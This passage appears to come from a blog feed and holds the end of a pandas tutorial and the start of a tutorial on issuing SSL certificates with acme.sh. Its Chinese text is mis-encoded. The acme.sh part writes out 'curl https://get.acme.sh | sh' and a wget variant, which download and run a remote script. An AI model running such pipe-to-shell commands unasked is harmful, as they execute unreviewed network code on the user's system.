<td>-2.753986</td>    </tr>    <tr>      <th>988</th>      <td>2022-09-15</td>      <td>22.890536</td>      <td>-27.813985</td>      <td>-23.938164</td>      <td>-3.195772</td>    </tr>    <tr>      <th>989</th>      <td>2022-09-16</td>      <td>23.138447</td>      <td>-25.855344</td>      <td>-24.390078</td>      <td>-3.612660</td>    </tr>    <tr>      <th>990</th>      <td>2022-09-17</td>      <td>23.163567</td>      <td>-26.157774</td>      <td>-24.309178</td>      <td>-3.155928</td>    </tr>    <tr>      <th>991</th>      <td>2022-09-18</td>      <td>20.973996</td>      <td>-27.319631</td>      <td>-22.948785</td>      <td>-4.487101</td>    </tr>    <tr>      <th>992</th>      <td>2022-09-19</td>      <td>21.090756</td>      <td>-26.712847</td>      <td>-21.722990</td>      <td>-4.110810</td>    </tr>    <tr>      <th>993</th>      <td>2022-09-20</td>      <td>21.848391</td>      <td>-25.018472</td>      <td>-21.850579</td>      <td>-4.360523</td>    </tr>    <tr>      <th>994</th>      <td>2022-09-21</td>      <td>22.898217</td>      <td>-26.005364</td>      <td>-20.914269</td>      <td>-5.357187</td>    </tr>    <tr>      <th>995</th>      <td>2022-09-22</td>      <td>21.978310</td>      <td>-25.001244</td>      <td>-20.881626</td>      <td>-5.606849</td>    </tr>    <tr>      <th>996</th>      <td>2022-09-23</td>      <td>24.132628</td>      <td>-25.692639</td>      <td>-20.310265</td>      <td>-6.258977</td>    </tr>    <tr>      <th>997</th>      <td>2022-09-24</td>      <td>23.777794</td>      <td>-25.485527</td>      <td>-21.305882</td>      <td>-5.330284</td>    </tr>    <tr>      <th>998</th>      <td>2022-09-25</td>      <td>25.105611</td>      <td>-25.485135</td>      <td>-22.407657</td>      <td>-6.600228</td>    </tr>    <tr>      <th>999</th>      <td>2022-09-26</td>      <td>25.207099</td>      <td>-25.512208</td>      <td>-23.434955</td>      <td>-7.275999</td>    </tr>  </tbody></table><p>1000 rows Ã— 5 columns</p></div><h2 id="0x0F-é™·é˜±-Gotchas"><a href="#0x0F-é™·é˜±-Gotchas" class="headerlink" title="0x0F é™·é˜± Gotchas"></a>0x0F é™·é˜± Gotchas</h2><p>å¦‚æœä½ åœ¨è¿è¡Œä¸­çœ‹åˆ°ä¾‹å¦‚ä¸‹é¢çš„å¼‚å¸¸ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I was true"</span><span class="token punctuation">)</span></code></pre><pre><code>---------------------------------------------------------------------------ValueError                                Traceback (most recent call last)&lt;ipython-input-304-5c782b38cd2f&gt; in &lt;module&gt;----&gt; 1 if pd.Series([False, True, False]):      2     print("I was true")D:\Programs\Anaconda\lib\site-packages\pandas\core\generic.py in __nonzero__(self)   1476         raise ValueError("The truth value of a {0} is ambiguous. "   1477                          "Use a.empty, a.bool(), a.item(), a.any() or a.all()."-&gt; 1478                          .format(self.__class__.__name__))   1479    1480     __bool__ = __nonzero__ValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all().</code></pre><p>å¯ä»¥å‚è€ƒ <a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/basics.html#basics-compare">Comparisons</a> è¿™é‡Œæ¥å¯»æ±‚è§£é‡Šå’Œä¸‹ä¸€æ­¥çš„æ–¹æ¡ˆã€‚</p><p>ä¹Ÿå¯ä»¥å‚è€ƒ <a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/gotchas.html#gotchas">Comparisons</a>ã€‚</p><p><em>ï¼ˆä¸Šé¢éƒ½æ˜¯å®˜æ–¹çš„æ–‡æ¡£åœ°å€ï¼‰</em></p><p>ï¼ˆå®˜æ–¹æ–‡æ¡£åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼‰</p><br><hr><h2 id="0x10-å°ç»“"><a href="#0x10-å°ç»“" class="headerlink" title="0x10 å°ç»“"></a>0x10 å°ç»“</h2><p><strong>å…³äºé€‰å–ï¼š</strong></p><ul><li>é€‰æ‹©<strong>æ•´è¡Œ/æ•´åˆ—</strong>ï¼Œæˆ–<strong>å¤šä¸ªæ•´è¡Œ/å¤šä¸ªæ•´åˆ—</strong>çš„æ•°æ®ï¼Œå¯ä»¥ç”¨<code>df[]</code>ã€<code>df.loc[]</code>ã€<code>df.iloc[]</code>è¿™ä¸‰ç§ç”¨æ³•ã€‚</li><li><strong>åŒºåŸŸé€‰å–</strong>ï¼Œåˆ†ä¸º<strong>æ ‡ç­¾ç´¢å¼•</strong>å’Œ<strong>æ•´æ•°ç´¢å¼•</strong><ul><li>æ ‡ç­¾ç´¢å¼•ï¼š<code>df.loc[]</code></li><li>æ•´æ•°ç´¢å¼•ï¼š<code>df.iloc[]</code></li></ul></li><li><strong>é€‰å–å•å…ƒæ ¼</strong>ï¼š<code>df.at[]</code>ã€<code>df.iat[]</code>ã€<code>df.loc[]</code>ã€<code>df.iloc[]</code> éƒ½å¯ä»¥ï¼Œè¦æ³¨æ„å‚æ•°ã€‚<code>df[]</code>ä¸è¡Œï¼</li><li>å…³äºé€‰å–çš„è¿”å›å€¼ï¼š<ul><li>è¿”å›å€¼åŒ…æ‹¬<strong>å•è¡Œå¤šåˆ—</strong>æˆ–<strong>å¤šè¡Œå•åˆ—</strong>æ—¶ï¼Œè¿”å›å€¼ä¸º Series å¯¹è±¡</li><li>è¿”å›å€¼åŒ…æ‹¬<strong>å¤šè¡Œå¤šåˆ—</strong>æ—¶ï¼Œè¿”å›å€¼ä¸º DataFrame å¯¹è±¡</li><li>è¿”å›å€¼ä»…ä¸ºä¸€ä¸ªå•å…ƒæ ¼ï¼ˆå•è¡Œå•åˆ—ï¼‰æ—¶ï¼Œè¿”å›å€¼ä¸ºï¼ˆå¯èƒ½æ˜¯ numpy çš„ï¼‰åŸºæœ¬æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ str, float64, int64 ç­‰</li><li><code>df[]</code>å› ä¸ºä¸èƒ½ç²¾ç¡®åˆ°å•å…ƒæ ¼ï¼Œæ‰€ä»¥è¿”å›å€¼ä¸€å®š DataFrame æˆ– Series å¯¹è±¡</li></ul></li><li>å½“ä½¿ç”¨ DataFrame çš„é»˜è®¤ç´¢å¼•ï¼ˆæ•´æ•°ç´¢å¼•ï¼‰æ—¶ï¼Œæ•´æ•°ç´¢å¼•å³ä¸ºæ ‡ç­¾ç´¢å¼•ã€‚</li></ul><p>å…¶å® pandas è¿˜æœ‰å¾ˆå¤šæœ‰ç”¨çš„ API è¿™é‡Œé¢è¿˜æ²¡ä»‹ç»ï¼Œåé¢æœ‰ç©ºå†æ…¢æ…¢äº†è§£å‘¢ã€‚</p><p>åšé¡¹ç›®çš„æ—¶å€™çœ‹çœ‹åˆ«äººåšè¿‡çš„å®ä¾‹ï¼Œå†æ·±å…¥çœ‹çœ‹ç›¸å…³çš„ API å¥½äº†ã€‚</p><p>å¤§æ¦‚å°±è¿™äº›å†…å®¹äº†å§ã€‚</p><p>ï¼ˆæºœäº†æºœäº†</p><p><strong>20200418 æ›´æ–°ï¼š</strong></p><p><strong>Jupyter Notebook æ–‡æ¡£</strong> (<code>.ipynb</code>) æ”¾åˆ° GitHub ä¸Šäº†ï¼Œè¯¦è§è¿™é‡Œï¼š<a href="https://github.com/miaotony/DataScience/blob/master/10_Minutes_to_pandas.ipynb">https://github.com/miaotony/DataScience/blob/master/10_Minutes_to_pandas.ipynb</a></p><p>ä¸‹è½½æ–‡æ¡£çš„è¯ <a href="https://cdn.jsdelivr.net/gh/miaotony/DataScience@master/10_Minutes_to_pandas.ipynb">æˆ³è¿™é‡Œï¼ˆCDNï¼Œæ¨èï¼‰</a> å‘¢ï¼æˆ–è€… <a href="https://raw.githubusercontent.com/miaotony/DataScience/master/10_Minutes_to_pandas.ipynb">ä¹Ÿå¯ä»¥æˆ³è¿™é‡Œï¼ˆGitHub rawï¼‰</a>ï¼</p><hr><h2 id="0xFF-References-amp-Extensive-Reading"><a href="#0xFF-References-amp-Extensive-Reading" class="headerlink" title="0xFF References &amp; Extensive Reading"></a>0xFF References &amp; Extensive Reading</h2><p><a href="https://pandas.pydata.org/pandas-docs/version/0.22.0/10min.html">å®˜æ–¹çš„ 10 Minutes to pandas</a></p><p>[pythonæ•°æ®åˆ†æä¹‹pandasæ•°æ®é€‰å–ï¼šdf<a href="https://www.cnblogs.com/chenhuabin/p/10485549.html">] df.loc[] df.iloc[] df.ix[] df.at[] df.iat[]</a></p><p><a href="https://www.zhihu.com/question/56310477/answer/873227129">å­¦ä¹ pythonä¸­çš„pandasæœ‰æ²¡æœ‰å¥½çš„æ•™ç¨‹æ¨èï¼Ÿ</a></p><p><a href="https://zhuanlan.zhihu.com/p/97617276">ä»Excelåˆ°Pythonï¼šæœ€å¸¸ç”¨çš„36ä¸ªPandaså‡½æ•°ï¼</a></p><p>etc.</p>]]></content>
      
      
      <categories>
          
          <category> DataScience </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Develop </tag>
            
            <tag> DataScience </tag>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºacme.shä»Let&#39;s encryptç”Ÿæˆå…è´¹ä¸”è‡ªåŠ¨æ›´æ–°çš„SSLè¯ä¹¦</title>
      <link href="2020/03/28/Server_IssueACertWithACME/"/>
      <url>2020/03/28/Server_IssueACertWithACME/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>3æœˆ26æ—¥ï¼Œä¸€å † GitHub Pages ä»¥åŠ jd.com ç­‰ç½‘ç«™çš„ SSL è¯ä¹¦è¢«ä¸€ä¸ªè‡ªç­¾åè¯ä¹¦ ï¼ˆ<code>C=CN; ST=GD; L=SZ; O=COM; OU=NSP; CN=SERVER; emailAddress=346608453@qq.com</code> ï¼‰åŠ«æŒäº†ï¼Œå¼€å¯äº† HSTS åˆ™ä¼šè¢«æµè§ˆå™¨æ‹¦ä¸‹æ¥ã€‚ä¸è¿‡å¥—äº† CF çš„ CDN åˆ™ä¸å—å½±å“ã€‚27æ—¥å‘ç° <code>*.github.io</code> å¥½äº†ï¼ŒGitHub ä¸»ç«™è¢«åŠ«æŒäº†â€¦â€¦ï¼ˆçœŸç‹ å•Š</p><blockquote><p>å…·ä½“å‚è€ƒè¿™å‡ ç¯‡ï¼š</p><p><a href="https://www.v2ex.com/t/656367">https://www.v2ex.com/t/656367</a><br><a href="https://www.v2ex.com/t/656394">https://www.v2ex.com/t/656394</a><br><a href="https://m.cnbeta.com/view/960295.htm">https://m.cnbeta.com/view/960295.htm</a><br><a href="https://blog.netlab.360.com/ongoing-websites-hijacking/">ä¸€äº›ç½‘ç«™httpsè¯ä¹¦å‡ºç°é—®é¢˜çš„æƒ…å†µåˆ†æ</a>  </p><p><em>ï¼ˆæœ€åè¿™ç¯‡è¯´å¾ˆå¤šå¤§ç«™éƒ½å—å½±å“äº†</em></p></blockquote><p>HTTPS åŠ å¯†é€šä¿¡æŒºé‡è¦çš„ï¼Œä¹‹å‰ä¹Ÿå¬è¯´è¿‡ MITMï¼ˆä¸­é—´äººæ”»å‡»ï¼‰ï¼Œä¸è¿‡è¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´è¯ä¹¦è¢«åŠ«æŒçš„â€¦â€¦</p><p>æ€ä¹ˆè¯´å¥½å‘¢ï¼Œåº”è¯¥å¯ä»¥è¯´ç½‘ç»œä¸Šä¸èƒ½ä¿è¯ç»å¯¹å®‰å…¨å§ï¼Œæˆ–è€…è¯´ç»å¯¹å®‰å…¨æ˜¯ä¸å­˜åœ¨çš„ã€‚</p><p>æƒ³èµ·æ¥ä¹‹å‰æ­å»ºçš„ä¸€ä¸ªæœåŠ¡è¿˜æ²¡ä¸Š HTTPSï¼Œç„¶è€Œæƒ³ä¸èµ·æ¥ä¹‹å‰æ˜¯æ€ä¹ˆé…ç½® SSL è¯ä¹¦çš„äº†ï¼Œ<em>ç„¶ååˆå¾—å»æ‰¾èµ„æ–™<del>çƒ¦æ­»äº†</del>ï¼Œ</em>äºæ˜¯è¿™å›é¡ºä¾¿æ¥è®°å½•ä¸€ä¸‹å¥½äº†å•¦ã€‚ï¼ˆæ‘Šæ‰‹</p><p><strong>é€šè¿‡ Letâ€™s encrypt å¯ä»¥è·å¾— 90 å¤©å…è´¹ä¸”å¯ç»­æœŸçš„ SSL è¯ä¹¦ï¼Œè€Œåˆ©ç”¨ acme.sh å¯ä»¥è‡ªåŠ¨ç”Ÿæˆå’Œæ›´æ–°</strong>ï¼Œå°±æ¥ä»‹ç»ä¸€ä¸‹<strong>é…ç½®çš„è¿‡ç¨‹</strong>å§ã€‚</p><blockquote><p>å½“ç„¶ï¼Œä½ è¿˜å¯ä»¥å°è¯•ç”¨ Letâ€™s Encrypt çš„ <code>certbot</code> å·¥å…·æ¥ç­¾å‘è¯ä¹¦ï¼Œä¸è¿‡è¦è£…ä¸€å †åº“å§ï¼Œæˆ‘ä¹Ÿä¸è®°å¾—äº†â€¦â€¦</p></blockquote><p>ä¸‹é¢çš„å†…å®¹æ¶‰åŠ acme.sh çš„å®‰è£…ï¼Œè¯ä¹¦çš„ç­¾å‘åŠè®¤è¯ï¼Œå¦‚ä½•å®‰è£…åˆ° nginxï¼Œä»¥åŠè‡ªåŠ¨æ›´æ–°è¯ä¹¦ã€æ›´æ–° acme.sh ç­‰ã€‚</p><br><h2 id="0x01-å®‰è£…-acme-sh"><a href="#0x01-å®‰è£…-acme-sh" class="headerlink" title="0x01 å®‰è£… acme.sh"></a>0x01 å®‰è£… acme.sh</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> https://get.acme.sh <span class="token operator">|</span> <span class="token function">sh</span></code></pre><p>æˆ–è€…</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -O -  https://get.acme.sh <span class="token operator">|</span> <span class="token function">sh</span></code></pre><p>æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤ï¼Œå®ƒä¼šï¼š</p><ul><li>ä» GitHub ä¸Šä¸‹è½½ sh è„šæœ¬å¹¶æ‰§è¡Œ</li><li>æŠŠæ–‡ä»¶è§£å‹åˆ°ç”¨æˆ·çš„ <code>~/.acme.sh</code>ç›®å½•ä¸‹</li><li>ç»™å‘½ä»¤è¡Œè®¾ç½®ä¸€ä¸ª<code>acme.sh</code>çš„ alias åˆ«å</li><li>æœ€åæ³¨å†Œä¸€ä¸ª cron å®šæ—¶ä»»åŠ¡æ¥è‡ªåŠ¨æ›´æ–°è¯ä¹¦ã€‚</li></ul><p>å®‰è£…å®Œæˆåè¦<strong>è‡ªè¡Œé‡å¯å‘½ä»¤è¡Œ</strong>ï¼Œæˆ–è€…<strong>é‡æ–°åŠ è½½ä¸€ä¸‹<code>.bashrc</code>æ–‡ä»¶</strong>ï¼ˆ<code>source ~/.bashrc</code>ï¼‰ã€‚</p><p>ç„¶åçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ç”Ÿæ•ˆã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ acme.sh -hhttps://github.com/acmesh-official/acme.shv2.8.6Usage: acme.sh  <span class="token builtin class-name">command</span> <span class="token punctuation">..</span>.<span class="token punctuation">[</span>parameters<span class="token punctuation">]</span><span class="token punctuation">..</span><span class="token punctuation">..</span>Commands:  --help, -h               Show this <span class="token builtin class-name">help</span> message.  --version, -v            Show version info.  --install                Install acme.sh to your system.  --uninstall              Uninstall acme.sh, and uninstall the <span class="token function">cron</span> job.  --upgrade                Upgrade acme.sh to the latest code from https://github.com/acmesh-official/acme.sh.  --issue                  Issue a cert.  --signcsr                Issue a cert from an existing csr.  --deploy                 Deploy the cert to your server.  --install-cert           Install the issued cert to apache/nginx or any other server.<span class="token comment"># ......</span></code></pre><br><h2 id="0x02-ç­¾å‘-SSL-è¯ä¹¦"><a href="#0x02-ç­¾å‘-SSL-è¯ä¹¦" class="headerlink" title="0x02 ç­¾å‘ SSL è¯ä¹¦"></a>0x02 ç­¾å‘ SSL è¯ä¹¦</h2><p>ç­¾å‘ SSL è¯ä¹¦éœ€è¦è¯æ˜è¿™ä¸ªåŸŸåæ˜¯å±äºä½ çš„ï¼Œå³<strong>åŸŸåæ‰€æœ‰æƒ</strong>ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹å¼éªŒè¯ï¼šhttp å’Œ dns éªŒè¯ã€‚</p><p>é€šè¿‡ acme.sh å¯ä»¥ç­¾å‘å•åŸŸåã€å¤šåŸŸåã€æ³›åŸŸåè¯ä¹¦ï¼Œè¿˜å¯ä»¥ç­¾å‘ ECC è¯ä¹¦ã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œè¿™é‡Œä»¥<strong>å•åŸŸåè¯ä¹¦</strong>ä¸ºä¾‹ï¼Œåé¢å†æ‹“å±•ä¸€ä¸‹å¥½äº†ã€‚</p><p><strong>ä¸‹é¢ä»»æ„ä¸€ç§æ–¹å¼åªè¦å®‰è£…æˆåŠŸäº†å°±è¡Œï¼</strong></p><p>æ³¨æ„ï¼šè¿™ä¸€æ­¥<strong>åªæ˜¯ç”Ÿæˆäº†è¯ä¹¦ï¼Œå¹¶æ²¡æœ‰è¿›è¡Œé…ç½®</strong>ï¼Œå› æ­¤è®¿é—®ç½‘ç«™å½“ç„¶ä¸Šä¸äº† httpsã€‚</p><h3 id="2-1-HTTP-éªŒè¯"><a href="#2-1-HTTP-éªŒè¯" class="headerlink" title="2.1 HTTP éªŒè¯"></a>2.1 HTTP éªŒè¯</h3><p>è¿™ç§æ–¹å¼ <code>acme.sh</code> ä¼šè‡ªåŠ¨åœ¨ä½ çš„ç½‘ç«™æ ¹ç›®å½•ä¸‹æ”¾ç½®ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¥éªŒè¯ä½ çš„åŸŸåæ‰€æœ‰æƒï¼ŒéªŒè¯ä¹‹åå°±ç­¾å‘è¯ä¹¦ï¼Œæœ€åä¼šè‡ªåŠ¨åˆ é™¤éªŒè¯æ–‡ä»¶ã€‚</p><p><strong>å‰ææ˜¯è¦ç»‘å®šçš„åŸŸåå·²ç»ç»‘å®šåˆ°äº†æ‰€åœ¨æœåŠ¡å™¨ä¸Šï¼Œä¸”å¯ä»¥é€šè¿‡å…¬ç½‘è¿›è¡Œè®¿é—®ï¼</strong></p><h4 id="2-1-1-Webroot-mode"><a href="#2-1-1-Webroot-mode" class="headerlink" title="2.1.1  Webroot mode"></a>2.1.1  Webroot mode</h4><p>å‡è®¾æœåŠ¡å™¨åœ¨è¿è¡Œç€çš„ï¼Œç½‘ç«™åŸŸåä¸º <code>example.com</code>ï¼Œæ ¹ç›®å½•ä¸º <code>/home/wwwroot/example.com</code>ã€‚é‚£ä¹ˆåªéœ€è¦æ‰§è¡Œä¸‹é¢è¿™æ¡è¯­å¥å°±è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  -d example.com  -w /home/wwwroot/example.com</code></pre><h4 id="2-1-2-Apache-Nginx-mode"><a href="#2-1-2-Apache-Nginx-mode" class="headerlink" title="2.1.2 Apache / Nginx mode"></a>2.1.2 Apache / Nginx mode</h4><p>å¦‚æœç”¨çš„æ˜¯ Apache æˆ–è€… Nginx æœåŠ¡å™¨ï¼Œå¯ä»¥è‡ªåŠ¨å¯»æ‰¾é…ç½®æ–‡ä»¶æ¥è¿›è¡Œç­¾å‘ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  -d example.com  --apache  <span class="token comment"># Apache</span>acme.sh  --issue  -d example.com  --nginx   <span class="token comment"># Nginx</span></code></pre><p>å¦‚æœæ‰¾ä¸åˆ°é…ç½®æ–‡ä»¶çš„è¯å¯ä»¥è‡ªè¡Œé…ç½®ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  -d example.com  --nginx /etc/nginx/nginx.conf  <span class="token comment"># æŒ‡å®šnginxçš„conf</span>acme.sh  --issue  -d example.com  --nginx /etc/nginx/conf.d/example.com.conf  <span class="token comment"># æŒ‡å®šç½‘ç«™çš„conf</span></code></pre><h4 id="2-1-3-Standalone-mode"><a href="#2-1-3-Standalone-mode" class="headerlink" title="2.1.3 Standalone mode"></a>2.1.3 Standalone mode</h4><p>è¿™ç§æ–¹å¼ä¸‹ï¼Œacme.sh ä¼šè‡ªå·±å»ºç«‹ä¸€ä¸ªæœåŠ¡å™¨æ¥å®Œæˆç­¾å‘ã€‚ä¸»è¦é€‚åˆçš„æ˜¯æ²¡æœ‰å»ºç«‹æœåŠ¡å™¨çš„æƒ…å†µï¼Œä¸è¿‡å…¶å®æœ‰æœåŠ¡å™¨çš„è¯åªè¦æš‚æ—¶å…³é—­ï¼Œä¸é€ æˆç«¯å£å†²çªå°±èƒ½ä½¿ç”¨ã€‚</p><p>http æ¨¡å¼ï¼Œ80ç«¯å£ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  -d example.com  --standalone</code></pre><p>å¦‚æœç”¨äº†åä»£ä¹‹ç±»çš„ä¸æ˜¯ 80 ç«¯å£ï¼Œåˆ™å¯ä»¥æ‰‹åŠ¨æŒ‡å®šã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  -d example.com  --standalone --httpport <span class="token number">88</span></code></pre><p>å½“ç„¶å®ƒè¿˜æ”¯æŒ tls æ¨¡å¼ï¼Œä¸æ˜¯ 443 ç«¯å£çš„è¯ä¹Ÿå¯ä»¥è‡ªè¡ŒæŒ‡å®šã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  -d example.com  --alpnacme.sh  --issue  -d example.com  --alpn --tlsport <span class="token number">8443</span>  <span class="token comment"># è‡ªè¡ŒæŒ‡å®štlsç«¯å£</span></code></pre><br><h3 id="2-2-DNS-éªŒè¯"><a href="#2-2-DNS-éªŒè¯" class="headerlink" title="2.2 DNS éªŒè¯"></a>2.2 DNS éªŒè¯</h3><p>è¿™ç§æ–¹å¼ä¸‹ï¼Œä¸éœ€è¦ä»»ä½•æœåŠ¡å™¨ï¼Œä¸éœ€è¦ä»»ä½•å…¬ç½‘ ipï¼Œåªéœ€è¦ dns çš„è§£æè®°å½•å³å¯å®ŒæˆéªŒè¯ã€‚</p><p>æ¯”å¦‚è¯´æœåŠ¡å™¨ä¸èƒ½ç›´æ¥å…¬ç½‘è®¿é—®ï¼Œä»¥åŠæŸäº› VPS ç›´æ¥ç»‘å®šåŸŸåæ²¡å¤‡æ¡ˆçš„è¯æ˜¯ä¸Šä¸å»çš„ï¼Œå°±éœ€è¦é‡‡ç”¨è¿™ç§æ–¹æ¡ˆäº†ã€‚<em>ï¼ˆæˆ‘çš„å°±æ˜¯äº†</em></p><p>å½“ç„¶ï¼Œæ‰‹é‡Œæœ‰åŸŸååªæ˜¯æƒ³ç”Ÿæˆä¸€ä¸ªè¯ä¹¦è€Œå·²ä¹Ÿå¯ä»¥è¿™ä¹ˆç”¨ã€‚</p><h4 id="2-2-1-DNS-API-mode"><a href="#2-2-1-DNS-API-mode" class="headerlink" title="2.2.1 DNS API mode"></a>2.2.1 DNS API mode</h4><p>è¿™ç§æ–¹å¼è´¼å¼ºå¤§ï¼Œç›´æ¥å¯ä»¥åˆ©ç”¨åŸŸåæœåŠ¡å•†æä¾›çš„ API å°±å¯ä»¥è‡ªåŠ¨å¸®ä½ æ·»åŠ  TXT è®°å½•å®ŒæˆéªŒè¯å’Œè¯ä¹¦ç­¾å‘ã€‚è€Œä¸”60å¤©åè¿˜å¯ä»¥è‡ªåŠ¨å®Œæˆç»­æœŸã€‚ï¼ˆæˆ‘å°±æ˜¯ç”¨è¿™ç§æ–¹å¼å®ç°å“’~</p><p>æ¯”å¦‚è¯´ CloudFlare çš„ï¼Œåœ¨<a href="https://dash.cloudflare.com/profile">è¿™é‡Œ</a>è·å–ä½ çš„API Keyã€‚å¯ä»¥ç”¨å…¨å±€ API Keyï¼Œå°†å‚æ•°å¯¼å…¥åˆ°å‘½ä»¤è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">CF_Token</span><span class="token operator">=</span><span class="token string">"sdfsdfsdfljlbjkljlkjsdfoiwje"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CF_Account_ID</span><span class="token operator">=</span><span class="token string">"xxxxxxxxxxxxx"</span></code></pre><p>ä¸ºäº†é™åˆ¶æƒé™ï¼Œå¯ä»¥æ–°å»ºä¸€ä¸ªåŒºåŸŸçš„ API Key. è¿™é‡Œåªéœ€è¦ Zone.DNS çš„ç¼–è¾‘æƒé™ï¼ˆrestrict the API Token only for write access to Zone.DNS for a single domainï¼‰å°±è¡Œã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">CF_Token</span><span class="token operator">=</span><span class="token string">"sdfsdfsdfljlbjkljlkjsdfoiwje"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CF_Account_ID</span><span class="token operator">=</span><span class="token string">"xxxxxxxxxxxxx"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">CF_Zone_ID</span><span class="token operator">=</span><span class="token string">"xxxxxxxxxxxxx"</span></code></pre><p><code>Account_ID</code> å’Œ <code>Zone_ID</code> åœ¨åŸŸåçš„ç®¡ç†é¡µé¢å³ä¸‹æ–¹å¯ä»¥å¾—åˆ°ã€‚</p><p>è€Œåå†ç­¾å‘è¯ä¹¦ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh --issue --dns dns_cf -d example.com </code></pre><p>ä¹‹åè¿™äº›é…ç½®ä¿¡æ¯ä¼šä¿å­˜åˆ° <code>~/.acme.sh/account.conf</code> è¿™ä¸ªæ–‡ä»¶é‡Œï¼Œåœ¨è¯ä¹¦ç»­æœŸæˆ–è€…å…¶ä»–åˆ©ç”¨ CF è¿›è¡ŒéªŒè¯çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚</p><p>å½“ç„¶ï¼Œå›½å†…ä¸€èˆ¬ç”¨çš„æ˜¯ DNSPodï¼Œä¹Ÿæä¾›äº† APIï¼Œç±»ä¼¼é…ç½®å°±å¥½äº†ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">DP_Id</span><span class="token operator">=</span><span class="token string">"1234"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">DP_Key</span><span class="token operator">=</span><span class="token string">"sADDsdasdgdsf"</span>acme.sh --issue --dns dns_dp -d example.com -d www.example.com</code></pre><p><em>ï¼ˆè¿™ä¸ªå…¶å®å°±æ˜¯å¤šåŸŸåç­¾å‘äº†ï¼‰</em></p><p>æ›´å¤šä¾‹å­å‚è€ƒå®˜æ–¹ Wiki å¥½äº†â†’ <a href="https://github.com/acmesh-official/acme.sh/wiki/dnsapi">How to use DNS API</a></p><h4 id="2-2-2-DNS-manual-mode"><a href="#2-2-2-DNS-manual-mode" class="headerlink" title="2.2.2 DNS manual mode"></a>2.2.2 DNS manual mode</h4><p>é€‚åˆåŸŸåæœåŠ¡å•†æ²¡æœ‰æä¾› API çš„æƒ…å†µï¼Œéœ€è¦è‡ªå·±åœ¨åŸŸåé…ç½®ä¸€ä¸ª TXT è®°å½•ï¼Œä¸”ä¸èƒ½è‡ªåŠ¨ç»­æœŸï¼Œæ¯æ¬¡éƒ½éœ€è¦é‡æ–°é…ç½®ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">acme.sh  --issue  -d example.com  --dns  -d www.example.com</code></pre><p>æ›´å¤šè¯·å‚è€ƒå®˜æ–¹æ•™ç¨‹ <a href="https://github.com/acmesh-official/acme.sh/wiki/DNS-manual-mode">DNS manual mode</a>ã€‚</p><h4 id="2-2-3-DNS-alias-mode"><a href="#2-2-3-DNS-alias-mode" class="headerlink" title="2.2.3 DNS alias mode"></a>2.2.3 DNS alias mode</h4><p>å¦‚æœåŸŸåæœåŠ¡å•†æ²¡æœ‰æä¾› APIï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªæŒºé‡è¦çš„åŸŸåï¼Œä¸ºäº†å®‰å…¨ä¸å¸Œæœ›æˆ–è€…ä¸æ–¹ä¾¿ç›´æ¥é…ç½®è¿™ä¸ªåŸŸåçš„è§£æè®°å½•ï¼Œå¯ä»¥é€šè¿‡å¦ä¸€ä¸ªæ²¡é‚£ä¹ˆé‡è¦çš„åŸŸåï¼ˆå¯èƒ½æ˜¯ä¸“é—¨ç”¨æ¥ç­¾å‘è¯ä¹¦çš„ï¼‰é—´æ¥è¿›è¡Œé…ç½®ã€‚</p><p>å®é™…ä¸Šè¿˜æ˜¯éœ€è¦æœ‰ä¸€ä¸ªåŸŸåæ¥éªŒè¯æ‰€æœ‰æƒå•¦ï¼</p><p>æ›´å¤šå‚è€ƒå®˜æ–¹æ•™ç¨‹ <a href="https://github.com/acmesh-official/acme.sh/wiki/DNS-alias-mode">DNS alias mode</a> å¥½äº†ã€‚</p><br><h3 id="2-3-å¤šåŸŸåé…ç½®"><a href="#2-3-å¤šåŸŸåé…ç½®" class="headerlink" title="2.3 å¤šåŸŸåé…ç½®"></a>2.3 